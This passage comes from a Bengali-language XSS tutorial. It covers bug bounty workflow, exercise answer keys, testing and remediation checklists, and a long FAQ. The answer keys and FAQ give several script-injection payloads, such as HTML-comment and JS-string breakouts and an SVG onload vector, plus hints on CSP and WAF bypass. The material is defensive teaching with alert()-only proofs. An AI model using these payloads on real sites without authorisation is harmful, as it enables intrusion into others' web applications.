    • ☑ URL/href input-এ স্কিম allowlist প্রয়োগ করা আছে (javascript: নিষিদ্ধ)।
    • ☑ XSS fix-এর জন্য automated regression test আছে।

    Bug Bounty Workflow

    প্রোগ্রাম নির্বাচন থেকে শুরু করে একটি দায়িত্বশীল, প্রমাণ-ভিত্তিক রিপোর্ট জমা দেওয়া পর্যন্ত সম্পূর্ণ ওয়ার্কফ্লো।

    ⚖️

    আইনি নোটিশ: শুধুমাত্র স্পষ্টভাবে scope-এ থাকা প্রোগ্রাম/টার্গেটে টেস্টিং করুন, এবং প্রোগ্রামের নিয়মাবলী (rules of engagement) সবসময় মেনে চলুন। Scope-এর বাইরে টেস্টিং, বা নিয়ম ভঙ্গ করা প্রোগ্রাম থেকে ban এবং আইনি ঝুঁকি — উভয়ই তৈরি করতে পারে।

    ১. Program Selection

    HackerOne, Bugcrowd, Intigriti-এর মতো প্ল্যাটফর্মে প্রোগ্রাম বাছাই করার সময় বিবেচনা করুন: scope কতটা স্পষ্ট ও বিস্তৃত, পূর্ববর্তী response time, XSS-এর জন্য reward range, এবং প্রোগ্রামটি নতুনদের জন্য উপযুক্ত কি না (কিছু প্রোগ্রাম অত্যন্ত প্রতিযোগিতামূলক, already heavily-tested)।

    ২. Scope Verification

    প্রোগ্রামের scope ডকুমেন্ট সতর্কতার সাথে পড়ুন — কোন ডোমেইন/সাবডোমেইন অন্তর্ভুক্ত, কোনগুলো explicitly বাদ (out-of-scope), self-XSS গ্রহণযোগ্য কি না, এবং কোন ধরনের testing নিষিদ্ধ (যেমন automated scanner দিয়ে উচ্চ-volume scanning)।

    ⚠️

    Scope ভুল বোঝা একটি অত্যন্ত সাধারণ ভুল — সন্দেহ হলে প্রোগ্রামের সাথে যোগাযোগ করে নিশ্চিত হয়ে নিন, অনুমান করে এগিয়ে যাবেন না।

    ৩. Input-Point Discovery

    অধ্যায় ৭-এ শেখা পদ্ধতি অনুসরণ করুন — Burp দিয়ে পুরো অ্যাপ্লিকেশন ক্রল করুন, প্রতিটি input point (URL parameter, form, API endpoint, header) ম্যাপ করুন।

    ৪. Manual Testing ও Hypothesis-Driven Approach

    দক্ষ bug hunter-রা random payload না ছুঁড়ে, একটি hypothesis নিয়ে এগোন: "এই ফিচারটি কীভাবে ইমপ্লিমেন্ট করা হয়েছে বলে মনে হচ্ছে, এবং কোথায় developer ভুল করতে পারতেন?" — যেমন একটি "preview" ফিচার, যা raw markdown-কে client-side-এ রেন্ডার করে, প্রায়ই sanitization মিস করার সম্ভাবনা বেশি থাকে।

    ৫. Reproducible Proof of Concept

    একটি ভালো PoC-তে থাকা উচিত: সুনির্দিষ্ট ধাপ (step-by-step), ব্যবহৃত exact payload, এবং প্রত্যাশিত ফলাফল — যাতে প্রোগ্রামের ট্রায়াজ টিম কোনো অতিরিক্ত প্রশ্ন ছাড়াই reproduce করতে পারে।

    ৬. Impact Verification

    অধ্যায় ১০-এর ফ্রেমওয়ার্ক ব্যবহার করে, প্রমাণ-ভিত্তিকভাবে impact যাচাই করুন — অনুমান নয়, প্রকৃত পর্যবেক্ষণ (যেমন HttpOnly আছে কি না, CSP আছে কি না) রিপোর্টে উল্লেখ করুন।

    বিভাগ D — Payload Debugging (২১–২৪)

    নিচের প্রতিটি পরিস্থিতিতে payload কেন কাজ করছে না তা ব্যাখ্যা করুন:

    Answer Key — বিভাগ A (সংক্ষিপ্ত)

    উত্তর ১–৮ দেখুন
    1. Cross-Site Scripting; এটি মূলত একটি client-side vulnerability (ব্রাউজারে execute হয়)।
    2. Source = attacker-controlled ডেটা প্রবেশের বিন্দু (যেমন URL parameter); Sink = যেখানে সেই ডেটা বিপজ্জনকভাবে ব্যবহৃত হয় (যেমন innerHTML)।
    3. Reflected: single request/response-এ, persist করে না। Stored: database/storage-এ সংরক্ষিত, একাধিক ভিকটিমকে প্রভাবিত করে।
    4. innerHTML স্ট্রিংকে HTML হিসেবে পার্স করে (বিপজ্জনক); textContent plain text হিসেবে বসায় (নিরাপদ)।
    5. Attacker-এর script, ভিকটিমের ব্রাউজারে, target সাইটের নিজস্ব origin থেকেই execute হয় — তাই SOP সেটিকে "সাইটেরই কোড" হিসেবে গণ্য করে।
    6. < → &lt;, > → &gt;।
    7. কারণ hash fragment (#...) কখনো সার্ভারে পাঠানো হয় না — শুধু client-side JS সেটি পড়ে।
    8. Content-Security-Policy; এটি নিয়ন্ত্রণ করে কোন উৎস থেকে script/style/resource লোড করা অনুমোদিত।

    Answer Key — বিভাগ B (কোড বিশ্লেষণ)

    উত্তর ৯–১৬ দেখুন
    1. নিরাপদ — textContent কখনো HTML পার্স করে না।
    2. নিরাপদ (যদি DOMPurify সঠিকভাবে configured ও up-to-date থাকে) — এটিই রেকমেন্ডেড প্যাটার্ন।
    3. Vulnerable — userId যদি quote ভাঙতে পারে ('), inline event handler-এর মধ্যে arbitrary JS যোগ করা সম্ভব।
    4. নিরাপদ — Jinja2-এর ডিফল্ট auto-escape সক্রিয়।
    5. Vulnerable — | safe filter auto-escape বন্ধ করে দেয়।
    6. নিরাপদ — JSX টেক্সট ইন্টারপোলেশন ডিফল্টভাবে auto-escaped।
    7. Vulnerable — dangerouslySetInnerHTML রaw HTML সরাসরি বসায়, কোনো sanitization উল্লেখ নেই।
    8. Vulnerable — javascript: স্কিম filter না হলে href ক্লিক করলে script execute হবে; এছাড়া " encode না হলে attribute breakout-ও সম্ভব।

    Answer Key — বিভাগ C (Context Identification)

    উত্তর ১৭–২০ দেখুন
    1. JS string context (object property-এর মান)। Payload: "}};alert(1);var x={a:{b:" বা সরলীকৃত: "};alert(1);//
    2. URL/attribute-এর অংশবিশেষ। যদি পুরো URL-ই reflect হয় (query param নয়), javascript:alert(1) চেষ্টা করা যায়; যদি শুধু query value হয়, সাধারণত কম এক্সপ্লয়টেবল, attribute breakout চেষ্টা করুন।
    3. CSS context। আধুনিক ব্রাউজারে সরাসরি JS execution কঠিন; এটি data exfiltration (যেমন CSS দিয়ে পরোক্ষভাবে তথ্য বের করা) বা পুরনো ব্রাউজার-নির্দিষ্ট ঝুঁকি হিসেবে বিবেচিত হতে পারে।
    4. HTML comment context। Payload: --><script>alert(1)</script><!--

    Answer Key — বিভাগ D (Payload Debugging)

    উত্তর ২১–২৪ দেখুন
    1. Output সঠিকভাবে HTML-encode হচ্ছে — এই নির্দিষ্ট context নিরাপদ; ভিন্ন context/parameter-এ চেষ্টা করুন।
    2. একটি CSP নীতি inline event handler ব্লক করছে (unsafe-inline নেই) — বিকল্প হিসেবে কোনো nonce/hash-allowed script সোর্স bypass সম্ভব কি না বিশ্লেষণ করুন, অথবা নোট করুন যে CSP কার্যকরভাবে protect করছে।
    3. Context ভুলভাবে ধরা হয়েছে — raw response আবার দেখে প্রকৃত surrounding syntax (JS string) অনুযায়ী payload পুনর্গঠন করুন (";alert(1);//)।
    4. সম্ভাব্য কারণ: payload সেই ডেটা দেখার মতো কোনো admin/এজেন্ট এখনও দেখেননি (সময় লাগতে পারে), collector নিজে ঠিকভাবে কনফিগার হয়নি, অথবা payload আদৌ সেই storage sink পর্যন্ত পৌঁছায়নি — ধৈর্য ধরুন ও collector সেটআপ যাচাই করুন।

    Answer Key — বিভাগ E (Remediation)

    উত্তর ২৫–২৭ দেখুন

    ২৫: Reflected XSS, HTML text context। Fix: escapeHtml(req.query.q) দিয়ে encode করুন অথবা auto-escaping templating engine ব্যবহার করুন।

    ২৬: DOM-based XSS, কোনো origin check নেই এবং innerHTML ব্যবহৃত হচ্ছে। Fix: if (e.origin !== 'https://trusted.example') return; যোগ করুন এবং innerHTML-এর বদলে textContent ব্যবহার করুন।

    ২৭: Naive blocklist, নেস্টেড ট্যাগ ও বিকল্প ভেক্টর (<img onerror>) দিয়ে bypass সম্ভব। Fix: DOMPurify-এর মতো allowlist-ভিত্তিক লাইব্রেরি দিয়ে প্রতিস্থাপন করুন।

    Answer Key — বিভাগ F (Scenario-Based)

    উত্তর ২৮–৩০ দেখুন

    ২৮: সাধারণত কম-গুরুত্বপূর্ণ/self-XSS হিসেবে বিবেচিত হয়, কারণ বাস্তবসম্মত কোনো attack scenario নেই (ভিকটিমকে নিজের বিরুদ্ধেই payload চালাতে হবে, এবং শেয়ারযোগ্য নয়)। অনেক প্রোগ্রাম এটি Informative হিসেবে বন্ধ করবে — তবুও রিপোর্ট করা উচিত, সততার সাথে এর সীমাবদ্ধতা উল্লেখ করে।

    ২৯: নিজের admin অ্যাক্সেস না থাকলে, impact "প্রমাণ" করার চেষ্টা না করে, শুধুমাত্র root cause (sanitization অনুপস্থিত), data flow, এবং সাধারণ জ্ঞান (admin panel কীভাবে কাজ করে তার ডকুমেন্টেশন/API থেকে) ভিত্তিক একটি যুক্তিসঙ্গত impact assessment লিখুন — কখনো admin অ্যাকাউন্টে অননুমোদিতভাবে প্রবেশের চেষ্টা করবেন না।

    ৩০: সততার সাথে পুরো চেইন (CSRF + self-XSS) ব্যাখ্যা করে রিপোর্ট করুন, এবং স্পষ্টভাবে দেখান কেন এই কম্বিনেশন প্রোগ্রামের "self-XSS out of scope" নীতির বাইরে পড়ে (কারণ attacker এখন অন্য ভিকটিমকেও প্রভাবিত করতে পারছেন তাদের অজান্তেই)।

    Safe Testing Checklist

    • ☑ শুধুমাত্র নিজের lab বা স্পষ্টভাবে অনুমোদিত/scope-ভুক্ত টার্গেটে টেস্ট করছি।
    • ☑ সবসময় harmless proof-of-execution (alert) ব্যবহার করছি, কখনো ডেটা চুরি/পরিবর্তনের চেষ্টা না।
    • ☑ Blind XSS টেস্টে শুধু নিজের নিয়ন্ত্রিত collector ব্যবহার করছি।
    • ☑ Time-based/delay-ভিত্তিক টেকনিক সীমিত সংখ্যায় রাখছি, যাতে সার্ভারে অপ্রয়োজনীয় লোড না পড়ে।
    • ☑ Unique marker string ব্যবহার করছি, যাতে false positive এড়ানো যায়।

    Remediation Checklist

    • ☑ Output encoding context-aware এবং output-time-এ প্রয়োগ করা হয়েছে।
    • ☑ বিপজ্জনক sink (innerHTML, eval) ব্যবহারের প্রতিটি instance review করা হয়েছে।
    • ☑ Rich HTML-এর জন্য DOMPurify (বা সমমানের) ব্যবহৃত হচ্ছে, কোনো কাস্টম regex sanitizer না।
    • ☑ CSP প্রয়োগ করা আছে, unsafe-inline ছাড়া।
    • ☑ Session cookie-তে HttpOnly, Secure, SameSite সেট করা আছে।
    • ☑ XSS fix regression test দিয়ে কভার করা আছে।

    Common Mistakes — সংক্ষিপ্ত পুনরালোচনা

    • শুধু input validation করে output encoding বাদ দেওয়া।
    • Blocklist-ভিত্তিক filter-এর উপর নির্ভর করা।
    • "আমরা modern framework ব্যবহার করি, তাই নিরাপদ" ধরে নেওয়া।
    • Admin/internal panel-কে কম যত্নসহকারে sanitize করা।
    • একটি জায়গায় ফিক্স করে ধরে নেওয়া সব জায়গায় ফিক্স হয়ে গেছে (একই ডেটা একাধিক জায়গায় রেন্ডার হতে পারে)।
    • CSP-কে output encoding-এর বিকল্প ভাবা।

    বিস্তারিত FAQ (৩০টি প্রশ্ন)

    ১. XSS কি এখনও প্রাসঙ্গিক, যেহেতু আধুনিক ফ্রেমওয়ার্ক auto-escape করে?

    হ্যাঁ, সম্পূর্ণভাবে প্রাসঙ্গিক। Auto-escaping ডিফল্ট সুরক্ষা দেয়, কিন্তু escape hatch API, legacy কোড, third-party ইন্টিগ্রেশন এবং misconfiguration-এর মাধ্যমে XSS এখনও OWASP Top 10-এর নিয়মিত অংশ।

    ২. XSS ও CSRF কি একসাথে ঘটতে পারে?

    হ্যাঁ — XSS প্রায়ই CSRF protection (token) বাইপাস করার একটি শক্তিশালী উপায়, কারণ XSS থাকলে attacker ভিকটিমের ব্রাউজার থেকেই CSRF token পড়ে ফেলতে পারে।

    ৩. HttpOnly cookie থাকলে কি XSS সম্পূর্ণ নিরাপদ হয়ে যায়?

    না। HttpOnly শুধু document.cookie দিয়ে সরাসরি cookie পড়া প্রতিরোধ করে — কিন্তু attacker তখনও ভিকটিমের সেশন ব্যবহার করে সরাসরি authenticated action চালাতে পারে।

    ৪. CSP থাকলে কি XSS টেস্ট করার প্রয়োজন নেই?

    না — CSP bypass প্রায়ই সম্ভব হয়, এবং CSP ভুল কনফিগার করা থাকতে পারে। CSP একটি defense-in-depth স্তর, একমাত্র প্রতিরক্ষা নয়।

    ৫. Self-XSS কি কখনো গুরুত্বপূর্ণ হতে পারে?

    হ্যাঁ, যদি এটি অন্য কোনো vulnerability (যেমন CSRF বা clickjacking)-এর সাথে চেইন করে অন্য ভিকটিমকে প্রভাবিত করা যায়।

    ৬. সব sanitizer কি সমান নিরাপদ?

    না — নিজে লেখা regex-ভিত্তিক sanitizer অত্যন্ত ঝুঁকিপূর্ণ। শুধুমাত্র সক্রিয়ভাবে রক্ষণাবেক্ষিত, ব্যাপকভাবে পরীক্ষিত লাইব্রেরি (DOMPurify) ব্যবহার করা উচিত।

    ৭. DOM-based XSS কেন server-side scanner মিস করে?

    কারণ payload কখনো সার্ভারে পাঠানো হয় না (যেমন hash fragment) — শুধুমাত্র client-side JavaScript অডিট করে এটি ধরা সম্ভব।

    ৮. একটি alert() পপআপ কি যথেষ্ট প্রমাণ?

    শিক্ষামূলক/lab প্রসঙ্গে, হ্যাঁ — এটি নিশ্চিত করে code execution ঘটছে। বাস্তব রিপোর্টে এর সাথে context ও impact বিশ্লেষণও যোগ করা উচিত।

    ৯. Markdown রেন্ডারিং কেন ঝুঁকিপূর্ণ?

    অনেক markdown parser raw HTML pass-through করে এবং নিজে sanitize করে না — তাই আউটপুট সবসময় untrusted HTML হিসেবে বিবেচনা করে আলাদাভাবে sanitize করা উচিত।

    ১০. SVG ফাইল কীভাবে XSS vector হতে পারে?

    SVG একটি XML-ভিত্তিক ফরম্যাট যার ভেতরে <script> থাকতে পারে — ব্রাউজারে সরাসরি খোলা হলে তা execute হতে পারে।

    ১১. Blind XSS collector হিসেবে third-party সার্ভিস ব্যবহার করা কি নিরাপদ?

    সতর্কতা প্রয়োজন — সংগ্রহ করা ডেটা সেই তৃতীয় পক্ষের নিয়ন্ত্রণে যেতে পারে। নিজের নিয়ন্ত্রণে থাকা collector সবসময় বেশি নিরাপদ।

    ১২. XSS দিয়ে কি সরাসরি সার্ভার হ্যাক করা সম্ভব?

    সরাসরি না — XSS মূলত client-side vulnerability। তবে এটি admin-এর browser-এ এমন action trigger করতে পারে যা পরোক্ষভাবে সার্ভার-সাইড পরিবর্তন ঘটায় (যেমন admin-এর সেশন ব্যবহার করে কনফিগারেশন পরিবর্তন)।

    ১৩. WAF (Web Application Firewall) থাকলে কি XSS সম্ভব নয়?

    না, WAF bypass প্রায়ই সম্ভব — encoding ভিন্নতা, কম পরিচিত ট্যাগ/ইভেন্ট, বা case variation দিয়ে। WAF একটি অতিরিক্ত স্তর, root-cause fix-এর বিকল্প নয়।

    ১৪. JSON response কি XSS থেকে নিরাপদ?

    JSON নিজে সরাসরি execute হয় না, কিন্তু JSON-এর ভেতরের স্ট্রিং যদি পরে client-side-এ innerHTML-এ বসানো হয়, তাহলে একই ঝুঁকি প্রযোজ্য।

    ১৫. XSS কি শুধুমাত্র ওয়েব ব্রাউজারেই ঘটে?

    প্রধানত হ্যাঁ, তবে যেকোনো HTML/JS রেন্ডার করা পরিবেশ (যেমন Electron অ্যাপ, ইমেইল ক্লায়েন্টের HTML preview, কিছু PDF viewer) একই ধরনের ঝুঁকিতে পড়তে পারে।

    ১৬. একটি ভাল bug bounty XSS রিপোর্টে সবচেয়ে বেশি গুরুত্ব কোথায় দিতে হয়?

    Reproducibility (স্পষ্ট ধাপ) ও evidence-based impact — অনুমাননির্ভর দাবির চেয়ে প্রকৃত পর্যবেক্ষণ (HttpOnly আছে কি না, CSP আছে কি না) অনেক বেশি মূল্যবান।

    ১৭. XSS কি GDPR/ডেটা প্রাইভেসি আইনের সাথে সম্পর্কিত?

    হ্যাঁ — যদি XSS দিয়ে ব্যক্তিগত ডেটা ফাঁস সম্ভব হয়, এটি একটি data-protection ঝুঁকি হিসেবেও বিবেচিত হতে পারে, যা প্রাসঙ্গিক আইন অনুযায়ী রিপোর্টিং বাধ্যবাধকতা তৈরি করতে পারে।

    ১৮. কেন একই payload বিভিন্ন ব্রাউজারে ভিন্নভাবে আচরণ করতে পারে?

    বিভিন্ন ব্রাউজার ইঞ্জিন HTML parsing ও malformed markup normalize করার ক্ষেত্রে সামান্য ভিন্ন আচরণ করে — এটি বিশেষভাবে mutation XSS গবেষণায় গুরুত্বপূর্ণ।

    ১৯. Input length limit কি XSS প্রতিরোধ করে?

    না সরাসরি না — অনেক payload (যেমন <svg onload=alert(1)>) খুবই ছোট, তাই length limit কার্যকর প্রতিরক্ষা নয়।

    ২০. একটি পেলোড URL-এ কাজ করছে কিন্তু POST body-তে করছে না কেন হতে পারে?

    বিভিন্ন input channel প্রায়ই কোডের ভিন্ন অংশ দিয়ে প্রসেস হয় — একটি জায়গায় encoding থাকলেও অন্য জায়গায় নাও থাকতে পারে; প্রতিটি channel আলাদাভাবে টেস্ট করা প্রয়োজন।

    ২১. Trusted Types কি সব ব্রাউজারে সমর্থিত?

    না, এটি তুলনামূলকভাবে নতুন একটি API এবং browser support সীমিত হতে পারে — তাই এটিকে একমাত্র প্রতিরক্ষা হিসেবে নির্ভর করা উচিত না, বরং output encoding-এর সাথে সম্পূরক হিসেবে ব্যবহার করা উচিত।

    ২২. একটি XSS payload যা শুধু Firefox-এ কাজ করে, Chrome-এ না — এটি কি গুরুত্বপূর্ণ?

    হ্যাঁ, এখনও গুরুত্বপূর্ণ — যেকোনো ব্যাপকভাবে ব্যবহৃত ব্রাউজারে vulnerability থাকলে তা সেই ব্রাউজার ব্যবহারকারী ভিকটিমদের জন্য ঝুঁকিপূর্ণ; রিপোর্টে ব্রাউজার-নির্দিষ্টতা স্পষ্টভাবে উল্লেখ করা উচিত।

    ২৩. DOM clobbering প্রতিরোধ করার সহজ উপায় কী?

    Global namespace-এ নির্ভর করার বদলে module-scoped variable ব্যবহার করা, এবং কোনো global object-এর টাইপ অনুমান না করে স্পষ্টভাবে যাচাই (typeof চেক) করা।

    ২৪. XSS vulnerability কি automated scanner দিয়ে সম্পূর্ণ শনাক্ত করা সম্ভব?

    আংশিকভাবে — scanner সাধারণ reflected/stored প্যাটার্ন ভালোভাবে ধরে, কিন্তু DOM-based, blind, এবং বিশেষ করে logic-নির্ভর/mutation XSS-এর জন্য ম্যানুয়াল বিশ্লেষণ এখনও অপরিহার্য।

    ২৫. কেন একটি ফিক্সড vulnerability পরবর্তীতে আবার ফিরে আসতে পারে (regression)?

    কোড refactor, নতুন ফিচার যোগ, বা টিম পরিবর্তনের কারণে আগের fix ভুলে যাওয়া/হারিয়ে যাওয়া সাধারণ ঘটনা — এজন্যই automated regression test গুরুত্বপূর্ণ।

    ২৬. একটি API যা শুধু mobile app ব্যবহার করে (ব্রাউজার না), তার কি XSS ঝুঁকি আছে?

    সরাসরি কম, যদি response কখনো কোনো ব্রাউজার/WebView-এ render না হয়। কিন্তু যদি সেই একই API response কখনো একটি admin ওয়েব ড্যাশবোর্ডেও দেখানো হয়, ঝুঁকি ফিরে আসে।

    ২৭. XSS ও clickjacking-এর সম্পর্ক কী?

    এগুলো ভিন্ন vulnerability, কিন্তু একসাথে চেইন করা যেতে পারে — যেমন একটি XSS দিয়ে পেজের layout পরিবর্তন করে clickjacking-এর জন্য প্রস্তুত করা।

    ২৮. "Reflected XSS সবসময় কম গুরুত্বপূর্ণ" — এটি কি সত্যি?

    না — একটি reflected XSS যদি কোনো interaction ছাড়াই (autofocus) trigger হয় এবং widely shared/high-traffic পেজে থাকে, এটি উল্লেখযোগ্য impact রাখতে পারে।

    ২৯. একাধিক XSS একসাথে পাওয়া গেলে কীভাবে রিপোর্ট করব?

    Root cause আলাদা হলে (ভিন্ন ফিচার, ভিন্ন ফিক্স প্রয়োজন) সাধারণত আলাদা রিপোর্ট ভালো; একই root cause-এর একাধিক instance হলে একটি রিপোর্টে একত্রে উল্লেখ করা যুক্তিসঙ্গত — প্রোগ্রামের নীতি অনুযায়ী সিদ্ধান্ত নিন।

    ৩০. এই ডকুমেন্টেশন শেষ করার পর পরবর্তী পদক্ষেপ কী হওয়া উচিত?

    PortSwigger Web Security Academy-এর XSS lab গুলো হাতে-কলমে practice করুন, OWASP Juice Shop/DVWA-তে নিজের পরিবেশে চর্চা করুন, এবং ধীরে ধীরে, দায়িত্বশীলভাবে, একটি সহজ bug bounty প্রোগ্রাম দিয়ে বাস্তব experience শুরু করুন।
